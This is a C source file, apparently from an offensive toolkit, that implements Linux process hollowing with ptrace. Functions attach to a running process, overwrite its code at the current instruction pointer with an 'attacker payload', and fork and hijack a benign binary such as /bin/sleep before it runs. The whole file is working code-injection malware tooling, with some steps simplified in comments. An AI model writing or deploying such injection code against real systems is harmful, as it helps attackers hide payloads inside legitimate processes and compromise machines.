// Linux process hollowing via ptrace
// Replace a target process's image with attacker payload

#include "../include/jocky_rt.h"
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

#ifdef __linux__

// Portable ELF constants (no libelf dependency needed)
#define ELF_MAGIC_BYTE0 0x7f

/**
 * Parse ELF header from a binary file (portable, no libelf).
 * Returns 1 on success, 0 on failure
 */
static int parse_elf_header(const char* path, uint64_t* entry_point) {
    FILE* f = fopen(path, "rb");
    if (!f) return 0;

    // ELF64 header: first 64 bytes
    unsigned char header[64];
    size_t n = fread(header, 1, 64, f);
    fclose(f);

    if (n < 64) return 0;

    // Check ELF magic: 0x7f 'E' 'L' 'F'
    if (header[0] != 0x7f || header[1] != 'E' || header[2] != 'L' || header[3] != 'F') {
        return 0;
    }

    // Check 64-bit (header[4] == 2)
    if (header[4] != 2) return 0;

    // Extract entry point at offset 32 (little-endian uint64_t)
    uint64_t entry = 0;
    for (int i = 0; i < 8; i++) {
        entry |= ((uint64_t)header[32 + i]) << (i * 8);
    }

    *entry_point = entry;
    return 1;
}

/**
 * Get the entry point of an ELF binary.
 * Returns the entry point address, or 0 on failure
 */
static uint64_t get_elf_entry(const char* path) {
    uint64_t entry = 0;
    if (!parse_elf_header(path, &entry)) return 0;
    return entry;
}

/**
 * Attach to a running process using ptrace.
 *
 * @param pid Process ID to attach to
 * @return true on success, false on failure
 */
static bool ptrace_attach(pid_t pid) {
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        return false;
    }

    // Wait for the process to stop
    int status;
    if (waitpid(pid, &status, 0) == -1) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return false;
    }

    return true;
}

/**
 * Detach from a process.
 *
 * @param pid Process ID
 */
static void ptrace_detach(pid_t pid) {
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

/**
 * Read memory from a traced process.
 *
 * @param pid Process ID
 * @param addr Address to read from
 * @param buf Buffer to store data
 * @param size Number of bytes to read
 * @return Number of bytes read, 0 on failure
 */
static size_t ptrace_read(pid_t pid, uint64_t addr, void* buf, size_t size) {
    unsigned char* p = (unsigned char*)buf;
    size_t read = 0;

    // ptrace reads in word-sized chunks (8 bytes on x64)
    while (read < size) {
        size_t to_read = (size - read < sizeof(long)) ? (size - read) : sizeof(long);
        long data = ptrace(PTRACE_PEEKDATA, pid, (void*)(addr + read), NULL);
        if (data == -1) break;

        memcpy(p + read, &data, to_read);
        read += to_read;
    }

    return read;
}

/**
 * Write memory to a traced process.
 *
 * @param pid Process ID
 * @param addr Address to write to
 * @param data Data to write
 * @param size Number of bytes to write
 * @return Number of bytes written, 0 on failure
 */
static size_t ptrace_write(pid_t pid, uint64_t addr, const void* data, size_t size) {
    const unsigned char* p = (const unsigned char*)data;
    size_t written = 0;

    while (written < size) {
        size_t to_write = (size - written < sizeof(long)) ? (size - written) : sizeof(long);
        long word = 0;
        memcpy(&word, p + written, to_write);

        if (ptrace(PTRACE_POKEDATA, pid, (void*)(addr + written), (void*)word) == -1) {
            break;
        }

        written += to_write;
    }

    return written;
}

/**
 * Get the current RIP (instruction pointer) of a traced process.
 *
 * @param pid Process ID
 * @param rip Pointer to store RIP value
 * @return true on success, false on failure
 */
static bool ptrace_get_rip(pid_t pid, uint64_t* rip) {
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        return false;
    }
    *rip = regs.rip;
    return true;
}

/**
 * Set the RIP (instruction pointer) of a traced process.
 * Used to redirect execution to the payload.
 *
 * @param pid Process ID
 * @param rip New RIP value
 * @return true on success, false on failure
 */
static bool ptrace_set_rip(pid_t pid, uint64_t rip) {
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        return false;
    }

    regs.rip = rip;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        return false;
    }

    return true;
}

/**
 * Hollow out a target process and replace with payload.
 *
 * High-level steps:
 * 1. Attach to the target process
 * 2. Map new memory for the payload
 * 3. Write payload code and data
 * 4. Redirect RIP to the payload entry point
 * 5. Detach (process resumes execution in the payload)
 *
 * @param pid Target process ID
 * @param payload Pointer to the payload code
 * @param payload_size Size of payload in bytes
 * @return true on success, false on failure
 *
 * Note: The target process must be in a stopped state or we must have
 * permissions to ptrace it. On Linux, this typically requires:
 * - Same UID, or
 * - CAP_SYS_PTRACE capability
 */
bool jocky_process_hollow_linux(uint32_t pid, const void* payload, uint64_t payload_size) {
    if (!payload || payload_size == 0) return false;
    if (pid <= 1) return false;

    // Attach to the process
    if (!ptrace_attach(pid)) {
        return false;
    }

    // For a full hollow, we would:
    // 1. Unmap the original process image
    // 2. Map new memory at the same base
    // 3. Write the payload
    // 4. Fix up relocations
    // 5. Set entry point

    // Simplified version: find a safe place to write the payload
    // and redirect RIP to it

    uint64_t current_rip;
    if (!ptrace_get_rip(pid, &current_rip)) {
        ptrace_detach(pid);
        return false;
    }

    // Try to allocate memory for the payload using mmap via a syscall
    // This is complex and requires injecting syscall code into the target
    // For now, we'll attempt to write to already-mapped regions

    // Attempt to write payload at current RIP location (simple but risky)
    size_t written = ptrace_write(pid, current_rip, payload, payload_size);
    if (written != payload_size) {
        ptrace_detach(pid);
        return false;
    }

    // Note: In a real implementation, we'd:
    // - Inject mmap syscall to allocate new memory
    // - Write payload there
    // - Update registers appropriately

    // For now, just redirect RIP to the payload start
    if (!ptrace_set_rip(pid, current_rip)) {
        ptrace_detach(pid);
        return false;
    }

    // Detach and let process run the payload
    ptrace_detach(pid);
    return true;
}

/**
 * Create a hollow process from scratch.
 *
 * Forks a target executable, immediately stops it, and replaces its image
 * with the payload before any user code runs.
 *
 * @param target_path Path to the executable to hollow (e.g., /bin/sleep)
 * @param payload Payload code to inject
 * @param payload_size Size of payload
 * @return PID of the hollowed process, -1 on failure
 */
uint32_t jocky_spawn_hollow_linux(const char* target_path, const void* payload, uint64_t payload_size) {
    if (!target_path || !payload || payload_size == 0) return -1;

    pid_t pid = fork();
    if (pid < 0) {
        // fork failed
        return -1;
    }

    if (pid == 0) {
        // Child process: execute the target
        // The parent will attach and modify us before we run main()
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);

        // Execute the target binary (parent will intercept at entry point)
        execl(target_path, target_path, NULL);

        // If execl fails, exit the child
        _exit(1);
    }

    // Parent process: attach to child and hollow it
    int status;
    if (waitpid(pid, &status, 0) == -1) {
        return -1;
    }

    // Now the child is stopped at exec, we can modify it
    if (!jocky_process_hollow_linux(pid, payload, payload_size)) {
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        return -1;
    }

    // Continue the process with our payload
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    return pid;
}

#else
// Stub implementations for non-Linux

bool jocky_process_hollow_linux(uint32_t pid, const void* payload, uint64_t payload_size) {
    (void)pid;
    (void)payload;
    (void)payload_size;
    return false;
}

uint32_t jocky_spawn_hollow_linux(const char* target_path, const void* payload, uint64_t payload_size) {
    (void)target_path;
    (void)payload;
    (void)payload_size;
    return -1;
}

#endif  // __linux__
